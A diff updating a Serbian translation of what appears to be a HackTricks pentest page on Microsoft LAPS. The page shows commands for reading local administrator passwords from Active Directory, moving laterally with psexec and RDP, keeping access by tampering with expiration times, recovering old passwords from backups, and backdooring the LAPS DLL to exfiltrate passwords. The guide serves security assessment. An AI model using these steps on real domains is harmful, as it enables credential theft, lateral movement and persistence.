@@ -5,36 +5,36 @@
 
 ## Osnovne informacije
 
-Trenutno postoje **2 LAPS varijante** koje možete da sretnete tokom procene:
+Trenutno postoje **2 LAPS varijante** sa kojima se možete susresti tokom procene:
 
-- **Legacy Microsoft LAPS**: čuva lozinku lokalnog administratora u **`ms-Mcs-AdmPwd`** i vreme isteka u **`ms-Mcs-AdmPwdExpirationTime`**.
-- **Windows LAPS** (ugrađen u Windows od April 2023 ažuriranja): i dalje može da emulira legacy režim, ali u nativnom režimu koristi **`msLAPS-*`** atribute, podržava **password encryption**, **password history**, i **DSRM password backup** za domain controllere.
+- **Legacy Microsoft LAPS**: čuva lozinku lokalnog administratora u atributu **`ms-Mcs-AdmPwd`**, a vreme isteka u atributu **`ms-Mcs-AdmPwdExpirationTime`**.
+- **Windows LAPS** (ugrađen u Windows od ažuriranja iz aprila 2023. godine): i dalje može da emulira legacy režim, ali u nativnom režimu koristi atribute **`msLAPS-*`**, podržava **šifrovanje lozinke**, **istoriju lozinki** i **backup DSRM lozinke** za kontrolere domena.
 
-LAPS je dizajniran da upravlja **lozinkama lokalnog administratora**, čineći ih **jedinstvenim, nasumičnim i često menjanim** na računarima priključenim na domain. Ako možete da čitate te atribute, obično možete da **pivotujete kao lokalni admin** na pogođeni host. U mnogim okruženjima, zanimljiv deo nije samo čitanje same lozinke, već i pronalaženje **ko je imao delegiran pristup** atributima lozinke.
+LAPS je dizajniran za upravljanje **lozinkama lokalnog administratora**, tako da one budu **jedinstvene, nasumično generisane i često menjane** na računarima pridruženim domenu. Ako možete da čitate te atribute, obično možete da izvršite **pivot kao lokalni administrator** na pogođeni host. U mnogim okruženjima nije zanimljivo samo čitanje same lozinke, već i pronalaženje **kome je delegiran pristup** atributima lozinke.
 
 ### Legacy Microsoft LAPS atributi
 
-U computer objektima domaina, implementacija legacy Microsoft LAPS rezultira dodavanjem dva atributa:
+U objektima računara u domenu, implementacija legacy Microsoft LAPS dodaje dva atributa:<sup>[[1]](#references)</sup>
 
-- **`ms-Mcs-AdmPwd`**: **plain-text lozinka administratora**
+- **`ms-Mcs-AdmPwd`**: **lozinka administratora u čistom tekstu**
 - **`ms-Mcs-AdmPwdExpirationTime`**: **vreme isteka lozinke**
 
 ### Windows LAPS atributi
 
-Native Windows LAPS dodaje nekoliko novih atributa u computer objekte:
+Nativni Windows LAPS dodaje nekoliko novih atributa objektima računara:<sup>[[2]](#references)</sup>
 
-- **`msLAPS-Password`**: clear-text password blob čuvan kao JSON kada encryption nije omogućen
-- **`msLAPS-PasswordExpirationTime`**: zakazano vreme isteka
-- **`msLAPS-EncryptedPassword`**: šifrovana trenutna lozinka
-- **`msLAPS-EncryptedPasswordHistory`**: šifrovana istorija lozinki
-- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: šifrovani DSRM podaci za lozinku za domain controllere
-- **`msLAPS-CurrentPasswordVersion`**: verzijsko praćenje zasnovano na GUID-u koje koristi novija logika za detekciju rollback-a (Windows Server 2025 forest schema)
+- **`msLAPS-Password`**: blob lozinke u čistom tekstu, sačuvan kao JSON kada šifrovanje nije omogućeno
+- **`msLAPS-PasswordExpirationTime`**: planirano vreme isteka
+- **`msLAPS-EncryptedPassword`**: trenutna šifrovana lozinka
+- **`msLAPS-EncryptedPasswordHistory`**: istorija šifrovanih lozinki
+- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: šifrovani podaci DSRM lozinke za kontrolere domena
+- **`msLAPS-CurrentPasswordVersion`**: praćenje verzije zasnovano na GUID-u, koje koristi novija logika za detekciju rollback-a (šema forest-a za Windows Server 2025)
 
-Kada je **`msLAPS-Password`** čitljiv, vrednost je JSON objekat koji sadrži ime naloga, vreme ažuriranja i clear-text lozinku, na primer:
+Kada je **`msLAPS-Password`** moguće čitati, vrednost je JSON objekat koji sadrži naziv naloga, vreme ažuriranja i lozinku u čistom tekstu, na primer:<sup>[[2]](#references)</sup>
 ```json
 {"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
 ```
-### Proveri da li je aktiviran
+### Proverite da li je aktivirano
 ```bash
 # Legacy Microsoft LAPS policy
 reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
@@ -58,11 +58,11 @@ select DnsHostname
 Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
 select DnsHostname
 ```
-## LAPS Password Access
+## Pristup LAPS lozinkama
 
-Možete **preuzeti raw LAPS policy** iz `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` i zatim koristiti **`Parse-PolFile`** iz paketa [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) da biste konvertovali ovu datoteku u format čitljiv za čoveka.
+Možete **preuzeti raw LAPS policy** iz `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol`, a zatim koristiti **`Parse-PolFile`** iz paketa [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) da biste ovu datoteku konvertovali u format čitljiv ljudima.
 
-### Legacy Microsoft LAPS PowerShell cmdlets
+### PowerShell cmdlets za legacy Microsoft LAPS
 
 Ako je legacy LAPS modul instaliran, sledeći cmdlets su obično dostupni:
 ```bash
@@ -85,7 +85,7 @@ Find-AdmPwdExtendedRights -Identity Workstations | fl
 # Read the password
 Get-AdmPwdPassword -ComputerName wkstn-2 | fl
 ```
-### Windows LAPS PowerShell cmdlets
+### Windows LAPS PowerShell cmdlet-i
 
 Native Windows LAPS dolazi sa novim PowerShell modulom i novim cmdlet-ima:
 ```bash
@@ -107,19 +107,19 @@ Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText
 $cred = Get-Credential CONTOSO\LAPSDecryptor
 Get-LapsADPassword -Identity wkstn-2 -AsPlainText -DecryptionCredential $cred
 ```
-Nekoliko operativnih detalja je ovde važno:
+Nekoliko operativnih detalja je važno:<sup>[[3]](#references)</sup>
 
-- **`Get-LapsADPassword`** automatski obrađuje **legacy LAPS**, **clear-text Windows LAPS** i **encrypted Windows LAPS**.
-- Ako je password encrypted i možete da ga **čitate** ali ne i **decrypt**ujete, cmdlet vraća metapodatke kao što su **`Source`**, **`DecryptionStatus`** i **`AuthorizedDecryptor`** čak i kada ne može da vrati clear-text password.
-- U **encrypted Windows LAPS**, **read permission** i **decrypt permission** su **različite kontrole**. To što imate OU / object read access ne znači automatski da možete decryptovati **`msLAPS-EncryptedPassword`**.
-- **Password history** je dostupna samo kada je omogućena **Windows LAPS encryption**.
-- Na domain controllers, vraćeni source može biti **`EncryptedDSRMPassword`**.
+- **`Get-LapsADPassword`** automatski podržava **legacy LAPS**, **clear-text Windows LAPS** i **encrypted Windows LAPS**.
+- Ako je lozinka encrypted i možete da je **read**, ali ne i da je **decrypt**, cmdlet vraća metapodatke kao što su **`Source`**, **`DecryptionStatus`** i **`AuthorizedDecryptor`**, čak i kada ne može da vrati lozinku u clear-text obliku.
+- Kod **encrypted Windows LAPS**, dozvola za **read** i dozvola za **decrypt** predstavljaju **različite kontrole**. To što imate read pristup OU-u / objektu ne znači automatski da možete da decryptujete **`msLAPS-EncryptedPassword`**.
+- **Password history** je dostupna samo kada je omogućeno **Windows LAPS encryption**.
+- Na domain controllerima, vraćeni source može biti **`EncryptedDSRMPassword`**.
 
-Ovo je korisno tokom assessment-a zato što polje **`AuthorizedDecryptor`** pokazuje **za kojeg user-a ili group** je blob bio encrypted, često pretvarajući neuspešno čitanje password-a u novu privilege-escalation metu.
+Ovo je korisno tokom procene jer polje **`AuthorizedDecryptor`** pokazuje **za kog usera ili grupu je blob encrypted**, često pretvarajući neuspešno čitanje lozinke u novu metu za eskalaciju privilegija.
 
 ### PowerView / LDAP
 
-**PowerView** se takođe može koristiti da se otkrije **ko može da čita password i da ga pročita**:
+**PowerView** se takođe može koristiti da se utvrdi **ko može da read password i da je read**:
 ```bash
 # Legacy Microsoft LAPS: find principals with rights over the OU
 Find-AdmPwdExtendedRights -Identity Workstations | fl
@@ -130,18 +130,18 @@ Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpira
 # Native Windows LAPS clear-text mode
 Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
 ```
-Ako je **`msLAPS-Password`** čitljiv, parsiraj vraćeni JSON i izvuci **`p`** za lozinku i **`n`** za ime upravljanog lokalnog admin naloga.
+Ako je **`msLAPS-Password`** dostupan za čitanje, parsirajte vraćeni JSON i izdvojite **`p`** za lozinku i **`n`** za ime upravljanog lokalnog administratorskog naloga.
 ```bash
 # Extract both the password and the real managed account name
 $laps = (Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password)."msLAPS-Password" | ConvertFrom-Json
 $laps.n
 $laps.p
 ```
-To **`n`** polje je važno na novijim deployment-ima zato što **Windows LAPS automatic account management** može da cilja **custom account** umesto ugrađenog **`Administrator`**, a noviji sistemi **Windows 11 24H2 / Windows Server 2025** mogu čak i da **randomize** taj naziv account-a.
+To **`n`** polje je važno u novijim implementacijama zato što **Windows LAPS automatic account management** može da cilja **custom account** umesto ugrađenog naloga **`Administrator`**, a noviji sistemi **Windows 11 24H2 / Windows Server 2025** mogu čak i da **randomize** naziv tog naloga.<sup>[[4]](#references)</sup>
 
-### Linux / remote tooling
+### Linux / alati za udaljeni pristup
 
-Modern tooling podržava i legacy Microsoft LAPS i Windows LAPS.
+Savremeni alati podržavaju i nasleđeni Microsoft LAPS i Windows LAPS.
 ```bash
 # NetExec / CrackMapExec lineage: dump LAPS values over LDAP
 nxc ldap 10.10.10.10 -u user -p password -M laps
@@ -162,23 +162,23 @@ get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
 ```
 Napomene:
 
-- Nedavne **NetExec** verzije podržavaju **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`**, i **`msLAPS-EncryptedPassword`**.
-- **`pyLAPS`** je i dalje koristan za **legacy Microsoft LAPS** sa Linux-a, ali cilja samo **`ms-Mcs-AdmPwd`**.
-- Noviji cross-platform alati kao što su **`LAPS4LINUX`**, alati zasnovani na **`dpapi-ng`**, i nedavni **NetExec** workflow-i takođe mogu da obrađuju **native Windows LAPS** sa ne-Windows hostova.
-- Ako okruženje koristi **encrypted Windows LAPS**, prost LDAP read nije dovoljan; takođe moraš biti **authorized decryptor** (ili imati ekvivalentan decryption materijal, kao što je offline domain DPAPI-NG root key material).
-- Na **Windows 11 24H2 / Windows Server 2025**, nemoj pretpostaviti da je managed local admin uvek **`Administrator`**. Automatic account management može da kreira custom account i opciono randomizuje njegovo ime, pa prvo otkrij ime naloga preko **`n`** / **`Account`** pre nego što koristiš **`--laps`** na velikoj skali.
+- Novije verzije **NetExec** podržavaju **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`** i **`msLAPS-EncryptedPassword`**.
+- **`pyLAPS`** je i dalje koristan za **legacy Microsoft LAPS** iz Linuxa, ali cilja samo **`ms-Mcs-AdmPwd`**.
+- Noviji cross-platform alati, kao što su **`LAPS4LINUX`**, alati zasnovani na **`dpapi-ng`** i noviji **NetExec** workflows, takođe mogu da rade sa **native Windows LAPS** sa non-Windows hostova.
+- Ako okruženje koristi **encrypted Windows LAPS**, jednostavno LDAP čitanje nije dovoljno; takođe morate biti **authorized decryptor** (ili imati ekvivalentni materijal za dešifrovanje, kao što je offline domain DPAPI-NG root key material).<sup>[[5]](#references)</sup>
+- Na sistemima **Windows 11 24H2 / Windows Server 2025** nemojte pretpostaviti da je managed local admin uvek **`Administrator`**. Automatic account management može da kreira prilagođeni nalog i opciono randomizuje njegovo ime, zato prvo pronađite ime naloga pomoću **`n`** / **`Account`**, pre nego što u velikom obimu koristite **`--laps`**.<sup>[[4]](#references)</sup>
 
-### Abusing directory synchronization
+### Zloupotreba directory synchronization-a
 
-Ako imaš domain-level **directory synchronization** prava umesto direktnog read access-a nad svakim computer object-om, LAPS i dalje može biti zanimljiv.
+Ako umesto direktnog read access-a na svakom computer object-u imate domain-level prava za **directory synchronization**, LAPS i dalje može biti zanimljiv.
 
-Kombinacija **`DS-Replication-Get-Changes`** sa **`DS-Replication-Get-Changes-In-Filtered-Set`** ili **`DS-Replication-Get-Changes-All`** može da se koristi za sinkronizaciju **confidential / RODC-filtered** atributa kao što je legacy **`ms-Mcs-AdmPwd`**. BloodHound ovo modeluje kao **`SyncLAPSPassword`**. Pogledaj [DCSync](dcsync.md) za background o replication-rights.
+Kombinacija prava **`DS-Replication-Get-Changes`** sa **`DS-Replication-Get-Changes-In-Filtered-Set`** ili **`DS-Replication-Get-Changes-All`** može se koristiti za sinhronizaciju **confidential / RODC-filtered** atributa, kao što je legacy **`ms-Mcs-AdmPwd`**. BloodHound ovo modeluje kao **`SyncLAPSPassword`**. Pogledajte [DCSync](dcsync.md) za pozadinu vezanu za replication rights.
 
 ## LAPSToolkit
 
-[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) olakšava enumeration LAPS-a kroz više funkcija.\
-Jedna je parsiranje **`ExtendedRights`** za **sve računare sa omogućenim LAPS-om.** Ovo prikazuje **grupe** koje su posebno **delegirane da čitaju LAPS lozinke**, a koje su često korisnici u protected grupama.\
-**Account** koji je **pridružen računar** domain-u dobija `All Extended Rights` nad tim hostom, i to pravo daje **account-u** mogućnost da **čita lozinke**. Enumeration može da pokaže korisnički nalog koji može da pročita LAPS lozinku na hostu. Ovo može da nam pomogne da **targetujemo specifične AD korisnike** koji mogu da čitaju LAPS lozinke.
+[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) olakšava enumeration LAPS-a pomoću nekoliko funkcija.<sup>[[6]](#references)</sup>\
+Jedna od njih je parsiranje **`ExtendedRights`** za **sve računare na kojima je LAPS omogućen.** Ovo prikazuje **grupe** kojima je konkretno **delegirano pravo da čitaju LAPS passwords**, a to su često korisnici u protected grupama.\
+**Nalog** koji je **pridružio računar** domen-u dobija `All Extended Rights` nad tim hostom, a ovo pravo tom **nalogu** omogućava da **čita passwords**. Enumeration može prikazati user account koji može da čita LAPS password na hostu. Ovo može pomoći da **targetiramo određene AD korisnike** koji mogu da čitaju LAPS passwords.
 ```bash
 # Get groups that can read passwords
 Find-LAPSDelegatedGroups
@@ -202,9 +202,9 @@ ComputerName                Password       Expiration
 ------------                --------       ----------
 DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
 ```
-## Dumping LAPS Passwords With NetExec / CrackMapExec
+## Izvlačenje LAPS lozinki pomoću NetExec / CrackMapExec
 
-Ako nemate interaktivni PowerShell, možete zloupotrebiti ovu privilegiju remoto preko LDAP:
+Ako nemate interaktivni PowerShell, ovu privilegiju možete zloupotrebiti udaljeno preko LDAP-a:
 ```bash
 # Legacy syntax still widely seen in writeups
 crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
@@ -212,9 +212,9 @@ crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
 # Current project name / syntax
 nxc ldap 10.10.10.10 -u user -p password -M laps
 ```
-Ovo dumpuje sve LAPS tajne koje korisnik može da pročita, omogućavajući vam da se krećete lateralno sa drugačijom lokalnom administratorskom lozinkom.
+Ovo izlistava sve LAPS secrets koje korisnik može da čita, omogućavajući vam da se krećete lateralno koristeći drugu lozinku lokalnog administratora.
 
-## Using LAPS Password
+## Korišćenje LAPS lozinke
 ```bash
 xfreerdp /v:192.168.1.1:3389 /u:Administrator
 Password: 2Z@Ae)7!{9#Cq
@@ -222,11 +222,11 @@ Password: 2Z@Ae)7!{9#Cq
 python psexec.py Administrator@web.example.com
 Password: 2Z@Ae)7!{9#Cq
 ```
-## LAPS Persistencija
+## LAPS Persistence
 
 ### Datum isteka
 
-Jednom kada ste admin, moguće je **dobiti lozinke** i **sprečiti** mašinu da **ažurira** svoju **lozinku** tako što ćete **postaviti datum isteka u budućnost**.
+Kada postanete admin, moguće je **preuzeti lozinke** i **sprečiti** mašinu da **ažurira** svoju **lozinku** tako što ćete **datum isteka postaviti u budućnost**.
 
 Legacy Microsoft LAPS:
 ```bash
@@ -237,7 +237,7 @@ Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime
 ## SYSTEM on the computer is needed
 Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
 ```
-Native Windows LAPS koristi **`msLAPS-PasswordExpirationTime`** umesto toga:
+Izvorni Windows LAPS umesto toga koristi **`msLAPS-PasswordExpirationTime`**:
 ```bash
 # Read the current expiration timestamp
 Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime
@@ -246,23 +246,23 @@ Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime
 Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
 ```
 > [!WARNING]
-> Lozinka će se i dalje rotirati ako **admin** koristi **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**, ili ako je omogućeno **Do not allow password expiration time longer than required by policy**.
+> Lozinka će se i dalje rotirati ako **admin** koristi **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**, ili ako je omogućena opcija **Do not allow password expiration time longer than required by policy**.
 
-### Snapshot rollback caveat on newer Windows LAPS
+### Napomena o vraćanju snapshot-a na novijem Windows LAPS-u
 
-Stariji trikovi sa rollback-om snapshot-a / image rollback-om su **manje pouzdani** protiv novijih **Windows LAPS** deployment-a. Na **Windows 11 24H2 / Windows Server 2025**, ako forest schema sadrži **`msLAPS-CurrentPasswordVersion`** (**Windows Server 2025 forest schema**), client poredi lokalno keširani GUID sa vrednošću sačuvanom u AD i **odmah rotira lozinku** kada rollback napravi **torn state**.
+Stariji trikovi za vraćanje snapshot-a / image-a su **manje pouzdani** protiv novijih **Windows LAPS** deployment-a. Na **Windows 11 24H2 / Windows Server 2025**, ako forest schema uključuje **`msLAPS-CurrentPasswordVersion`** (**Windows Server 2025 forest schema**), client upoređuje lokalno keširani GUID sa vrednošću sačuvanom u AD-u i **odmah rotira lozinku** kada rollback dovede do **torn state** stanja.
 
-U praksi, ovo znači da snapshot-based persistence ili pokušaji da se oživi starija poznata lokalna admin lozinka mogu brzo propasti umesto da prežive do sledećeg normalnog isteka.
+U praksi, to znači da persistence zasnovan na snapshot-u ili pokušaji oživljavanja ranije poznate lozinke lokalnog administratora mogu brzo propasti, umesto da opstanu do sledećeg uobičajenog isteka.<sup>[[2]](#references)</sup>
 
-Ova zaštita se primenjuje samo na **AD-backed Windows LAPS** i i dalje zavisi od toga da vraćena mašina može da se **authenticuje nazad na AD**. Ako mašina više ne može da komunicira sa AD, **password history** ili **AD backup access** i dalje mogu da spasu stvar.
+Ova zaštita se primenjuje samo na **AD-backed Windows LAPS** i i dalje zavisi od toga da li vraćena mašina može da se **autentifikuje nazad na AD**. Ako mašina više ne može da komunicira sa AD-om, **password history** ili **AD backup access** i dalje mogu spasiti situaciju.
 
-### Automatic account management tamper caveat
+### Napomena o tamper-u automatskog upravljanja nalozima
 
-Kada je **automatic account management** omogućen, Windows LAPS upravlja životnim ciklusom lokalnog admin naloga koji se administrira. Neočekivani pokušaji da se taj nalog preimenuje, ponovo konfiguriše ili na drugi način menja mogu biti odbijeni sa **`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`**, pa je persistence koja zavisi od tihog menjanja upravljanog LAPS naloga manje pouzdana na novijim endpoint-ovima.
+Kada je omogućeno **automatic account management**, Windows LAPS upravlja životnim ciklusom upravljanog lokalnog admin naloga. Neočekivani pokušaji preimenovanja, rekonfigurisanja ili drugog tamper-a nad tim nalogom mogu biti odbijeni uz **`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`**, pa je persistence koje zavisi od neprimetnog menjanja LAPS naloga manje pouzdan na novijim endpoint-ima.<sup>[[4]](#references)</sup>
 
-### Recovering historical passwords from AD backups
+### Oporavak istorijskih lozinki iz AD backup-a
 
-Kada je omogućeno **Windows LAPS encryption + password history**, montirani AD backup-ovi mogu postati dodatni izvor tajni. Ako možeš da pristupiš montiranom AD snapshot-u i koristiš **recovery mode**, možeš da upitaš starije sačuvane lozinke bez komunikacije sa živim DC.
+Kada je omogućeno **Windows LAPS encryption + password history**, montirani AD backup-i mogu postati dodatni izvor secrets-a. Ako možete da pristupite montiranom AD snapshot-u i koristite **recovery mode**, možete upitati starije sačuvane lozinke bez komunikacije sa aktivnim DC-om.<sup>[[3]](#references)</sup>
 ```bash
 # Query a mounted AD snapshot on port 50000
 Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode
@@ -270,21 +270,21 @@ Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode
 # Historical entries if history is enabled
 Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
 ```
-Ovo je uglavnom relevantno tokom **AD backup theft**, **offline forensics abuse**, ili **disaster-recovery media access**.
+Ovo je uglavnom relevantno tokom **krađe AD backup-a**, zloupotrebe **offline forensics** ili pristupa medijima za **disaster recovery**.
 
 ### Backdoor
 
-Originalni source code za legacy Microsoft LAPS može se naći [ovde](https://github.com/GreyCorbel/admpwd), zato je moguće ubaciti backdoor u code (na primer, unutar `Get-AdmPwdPassword` metode u `Main/AdmPwd.PS/Main.cs`) koji će na neki način **exfiltrate new passwords or store them somewhere**.
+Originalni source code za legacy Microsoft LAPS može se pronaći [ovde](https://github.com/GreyCorbel/admpwd), pa je moguće ubaciti backdoor u code (na primer unutar metode `Get-AdmPwdPassword` u `Main/AdmPwd.PS/Main.cs`) koji će na neki način **exfiltrate-ovati nove password-e ili ih sačuvati negde**.
 
-Zatim, kompajliraj novi `AdmPwd.PS.dll` i uploaduj ga na mašinu u `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (i promeni modification time).
+Zatim kompajlirajte novi `AdmPwd.PS.dll` i upload-ujte ga na mašinu u `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (i promenite vreme izmene).
 
-## References
+## Reference
 
-- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
-- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
-- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
-- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
-- [https://blog.xpnsec.com/lapsv2-internals/](https://blog.xpnsec.com/lapsv2-internals/)
-
+- [1] [Uvod u Microsoft LAPS – Local Administrator Password Solution](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
+- [2] [Windows LAPS schema i proširenja prava za Windows Server Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
+- [3] [Početak rada sa Windows LAPS i Windows Server Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
+- [4] [Načini upravljanja nalozima u Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
+- [5] [LAPS 2.0 Internals - XPN Infosec Blog](https://blog.xpnsec.com/lapsv2-internals/)
+- [6] [LAPSToolkit - leoloobeek](https://github.com/leoloobeek/LAPSToolkit)
 
 {{#include ../../banners/hacktricks-training.md}}
